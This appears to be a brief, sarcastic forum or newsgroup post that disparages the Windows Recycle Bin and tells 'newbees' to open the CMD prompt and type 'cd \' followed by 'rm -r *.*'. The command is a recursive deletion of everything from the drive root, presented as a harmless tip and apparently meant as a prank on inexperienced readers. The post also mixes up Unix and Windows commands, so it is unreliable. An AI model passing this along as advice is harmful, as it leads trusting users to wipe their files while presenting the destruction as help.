Nope.
Some newbees think that Windoze 'send-to-the-wastebasket' is a kernel-
level "safe-delete". It's just some ^&$)##*@*) program that slows most
of us down.
Even Windows/Professional/2000 (NT) developers knew that it was
garbage. If you've figured out how to get to the CMD prompt, just
type:
cd \
rm -r *.*

                del, following the Unix pathname tradition.
